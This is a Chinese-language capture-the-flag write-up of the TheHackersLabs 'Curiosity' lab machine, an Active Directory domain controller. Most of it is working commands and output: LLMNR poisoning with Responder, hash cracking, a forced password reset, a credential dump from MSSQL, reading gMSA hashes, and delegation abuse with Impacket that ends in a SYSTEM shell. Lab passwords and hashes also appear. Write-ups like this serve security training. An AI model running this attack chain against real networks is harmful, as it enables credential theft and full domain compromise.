{"pageProps":{"postData":{"id":"TheHackersLabsCuriosity","contentHtml":"<h1>Curiosity</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/23\">https://labs.thehackerslabs.com/machine/23</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<p><code>nmap</code> 端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity nmap -sT -min-rate 10000 -p- 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:28 CST\nWarning: 192.168.56.8 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.8\nHost is up (0.00052s latency).\nNot shown: 64857 closed tcp ports (conn-refused), 653 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49672/tcp open  unknown\n49683/tcp open  unknown\n49695/tcp open  unknown\n49703/tcp open  unknown\n49704/tcp open  unknown\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<p><code>UDP</code> 也扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity nmap -sU -min-rate 10000 -p- 192.168.56.8                                                                                                                                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:35 CST\nWarning: 192.168.56.8 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> hackme.thl (192.168.56.8)\nHost is up (0.032s latency).\nNot shown: 65449 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)\nPORT    STATE SERVICE\n53/udp  open  domain\n88/udp  open  kerberos-sec\n123/udp open  ntp\n137/udp open  netbios-ns\n389/udp open  ldap\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Curiosity nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:29 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.8\nHost is up (0.00050s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-19 05:30:19Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T05:31:22+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T05:31:22+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T05:31:22+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T05:31:22+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  msrpc         Microsoft Windows RPC\n49683/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-07-19T05:31:14\n|_  start_date: 2025-07-19T11:20:37\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_nbstat: NetBIOS name: DC, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:94:ab:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.8\n</code></pre>\n<h3>枚举测试</h3>\n<p>因为没有 <code>Web</code> 端口，我们从  <code>SMB</code> 服务开始枚举</p>\n<p>测试匿名账户</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity smbclient -L 192.168.56.8 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<p>在这里尝试枚举了很久，没结果</p>\n<h3>responder</h3>\n<p>打开 <code>Wireshark</code> 抓包看看</p>\n<p>看到<code>LLMNR</code>，让我想起了<code>NTLM</code>中继攻击</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image1.png\" alt=\"image.png\"></p>\n<p>打开 <code>responder</code></p>\n<pre><code class=\"hljs language-bash\">responder -I eth2\n</code></pre>\n<p>抓到 <code>jdoe</code> 的 <code>NET-NTLM hash</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image2.png\" alt=\"image.png\"></p>\n<p>使用 <code>hashcat</code> 进行爆破</p>\n<pre><code class=\"hljs language-bash\">hashcat -m 5600 <span class=\"hljs-built_in\">hash</span> /usr/share/seclists/Passwords/seasons.txt \n</code></pre>\n<p>得到密码<code>$pr1ng@</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image3.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity nxc smb hackme.thl -u jdoe -p <span class=\"hljs-string\">'$pr1ng@'</span>                                                         \nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\jdoe:<span class=\"hljs-variable\">$pr1ng</span>@ \n➜  Curiosity nxc ldap hackme.thl -u jdoe -p <span class=\"hljs-string\">'$pr1ng@'</span>\nLDAP        192.168.56.8    389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\nLDAP        192.168.56.8    389    DC               [+] hackme.thl\\jdoe:<span class=\"hljs-variable\">$pr1ng</span>@ \n➜  Curiosity nxc winrm hackme.thl -u jdoe -p <span class=\"hljs-string\">'$pr1ng@'</span>\nWINRM       192.168.56.8    5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.8    5985   DC               [+] hackme.thl\\jdoe:<span class=\"hljs-variable\">$pr1ng</span>@ (Pwn3d!)\n</code></pre>\n<p>当前用户可以拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\jdoe\\Desktop> <span class=\"hljs-built_in\">cat</span> user.txt\n{bdxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>域分析</h2>\n<p>收集数据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity bloodhound-python -d <span class=\"hljs-string\">'hackme.thl'</span> -ns 192.168.56.8 --zip -c All -dc <span class=\"hljs-string\">'DC.hackme.thl'</span> -u jdoe -p <span class=\"hljs-string\">'$pr1ng@'</span>\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: hackme.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 17 <span class=\"hljs-built_in\">users</span>\nINFO: Found 67 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 6 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.hackme.thl\nINFO: Connecting to GC LDAP server: DC.hackme.thl\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250719140452_bloodhound.zip\n</code></pre>\n<p>上 <code>BLoodhound</code></p>\n<p>用户组信息</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image4.png\" alt=\"image.png\"></p>\n<p><code>jdoe</code> 用户信息</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image5.png\" alt=\"image.png\"></p>\n<p>拥有强制修改<code>DBA_ADM</code> 的权限</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image6.png\" alt=\"image.png\"></p>\n<h2>横向移动</h2>\n<h3>To DBA_ADM</h3>\n<p>通过 <code>bloodyAD</code> 来修改其密码，失败了 ❌</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image7.png\" alt=\"image.png\"></p>\n<p>我们远程上去通过 <code>PowerShell</code> 改</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$SecPassword</span> = ConvertTo-SecureString <span class=\"hljs-string\">'$pr1ng@'</span> -AsPlainText -Force\n<span class=\"hljs-variable\">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class=\"hljs-string\">'HACKME\\jdoe'</span>, <span class=\"hljs-variable\">$SecPassword</span>)\n<span class=\"hljs-variable\">$UserPassword</span> = ConvertTo-SecureString <span class=\"hljs-string\">'Password123!'</span> -AsPlainText -Force\n. ./PowerView.ps1\nSet-DomainUserPassword -Identity DBA_ADM -AccountPassword <span class=\"hljs-variable\">$UserPassword</span> -Credential <span class=\"hljs-variable\">$Cred</span>\n</code></pre>\n<p>测试凭据</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image8.png\" alt=\"image.png\"></p>\n<h3>To sqlsvc</h3>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users> <span class=\"hljs-built_in\">ls</span>\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/18/2024   8:34 AM                Administrator\nd-----       10/17/2024   4:53 PM                dba_adm\nd-----       10/17/2024   2:56 PM                jdoe\nd-----       10/17/2024   7:49 PM                MSSQL<span class=\"hljs-variable\">$SQLEXPRESS</span>\nd-r---        9/12/2016   1:37 PM                Public\nd-----       10/18/2024   5:46 PM                sqlsvc\nd-----       10/17/2024   7:49 PM                SQLTELEMETRY<span class=\"hljs-variable\">$SQLEXPRESS</span>\n</code></pre>\n<p><code>winpeas</code> 枚举时能看到数据库的管道</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image10.png\" alt=\"image.png\"></p>\n<p>我们的用户应该是可以和数据库进行交互的</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"SELECT @@VERSION\"</span>\n\n--------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &#x3C;X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"select name FROM sys.databases\"</span>\nname\n-------------------------------------------------------------------------------------------\ntempdb\nmodel\nmsdb\nCredentialsDB\n\n(5 rows affected)\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE CredentialsDB;select name from  sys.tables\"</span>\nChanged database context to <span class=\"hljs-string\">'CredentialsDB'</span>.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE CredentialsDB;select * from Credentials\"</span>\nChanged database context to <span class=\"hljs-string\">'CredentialsDB'</span>.\nID          Username                                           Password\n----------- -------------------------------------------------- ---------------------------------------------\n          1 sqlsvc                                             23012244084524e51305f015727b890b\n\n(1 rows affected)\n</code></pre>\n<p>这样就读到了<code>sqlsvc</code>用户的密码</p>\n<p>到在线网站进行破解，得到密码 <code>P@ssword1234!</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image11.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity nxc smb hackme.thl -u sqlsvc -p <span class=\"hljs-string\">'P@ssword1234!'</span>\nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\sqlsvc:P@ssword1234! \n</code></pre>\n<h3>To GMSA_SVC$</h3>\n<p><code>SQLSVC</code> 账户可以读取 <code>GMAS</code> 密码</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image12.png\" alt=\"image.png\"></p>\n<p>读取 <code>gMSA</code> 的密码</p>\n<pre><code class=\"hljs language-bash\">➜  gMSADumper python gMSADumper.py -u sqlsvc -p <span class=\"hljs-string\">'P@ssword1234!'</span> -d hackme.thl\nUsers or <span class=\"hljs-built_in\">groups</span> <span class=\"hljs-built_in\">who</span> can <span class=\"hljs-built_in\">read</span> password <span class=\"hljs-keyword\">for</span> GMSA_SVC$:\n > GMSA_USERS\nGMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0\nGMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66\nGMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921\n</code></pre>\n<h3>To Administrator</h3>\n<p>我们寻找路径，发现<code>GMSA_SVC$</code> 对 <code>DC</code> 有 <code>AllowToAct</code> 权限</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity/image13.png\" alt=\"image.png\"></p>\n<p><code>AllowToAct</code> 就是 <code>AllowedToActOnBehalfOfOtherIdentity</code> ，<code>GMSA_SVC</code> 已添加到 <code>DC.HACKME.THL</code> 上的 <code>msds-AllowedToActOnBehalfOfOtherIdentity</code> 属性中</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity getST.py -spn <span class=\"hljs-string\">'cifs/DC.hackme.thl'</span> -impersonate <span class=\"hljs-string\">'administrator'</span> <span class=\"hljs-string\">'hackme.thl/GMSA_SVC$'</span> -hashes :e1eef5023c307890fdbb047e6554cfd0\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT <span class=\"hljs-keyword\">for</span> user\n[*] Impersonating administrator\n[*] Requesting S4U2Proxy\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> administrator@cifs_DC.hackme.thl@HACKME.THL.ccache\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Curiosity <span class=\"hljs-built_in\">export</span> KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache \n\n➜  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.hackme.thl.....\n[*] Found writable share ADMIN$\n[*] Uploading file vgKATdFu.exe\n[*] Opening SVCManager on dc.hackme.thl.....\n[*] Creating service VDYV on dc.hackme.thl.....\n[*] Starting service VDYV.....\n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\n24axxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>不算难，除了爆破的字典有点不明所以</p>\n<p>最后一步，直接看 <code>GMSA_SVC$</code> 的 <code>OutBound Execution</code>是空的，但自己寻找路径又能找到就有点奇怪</p>\n<p>下面的脚本为什么我们可以截取到 <code>jdoe</code> 用户的<code>NET NTLM HASH</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\temp> <span class=\"hljs-built_in\">cat</span> shareconnect.ps1\n\n<span class=\"hljs-keyword\">while</span> (<span class=\"hljs-variable\">$true</span>) {\n    <span class=\"hljs-comment\"># Comando net use para reconectar el recurso compartido</span>\n    net use Z: \\\\SQLserver\\bbdd /user:hackme\\jdoe <span class=\"hljs-string\">'$pr1ng@'</span>\n\n    <span class=\"hljs-comment\"># Espera de 1 minuto antes de volver a ejecutar</span>\n    Start-Sleep -Seconds 60\n}\n</code></pre>","title":"TheHackersLabs - Curiosity","date":"2025-07-19","updated":"2025-07-19","tags":["TheHackersLabs","Windows","AD","Responder","MSSQL","gMSA"],"categories":"靶机","comments":true,"description":"Curiosity\n\n https://labs.thehackerslabs.com/machine/23\n \n\n\n\nRecon\n\nPortScan\n\n`nmap` 端口扫描\n\n\n\n`UDP` 也扫描\n\n\n\n\n\n枚举测试\n\n因为没有 `Web` 端口，我们从  `SMB` 服务开始枚举\n\n测试匿名账户\n\n\n\n在这里尝试枚举了很久，没结果\n\nresponder\n\n打开 `Wireshark` 抓包..."},"recentPosts":[{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"}]},"__N_SSG":true}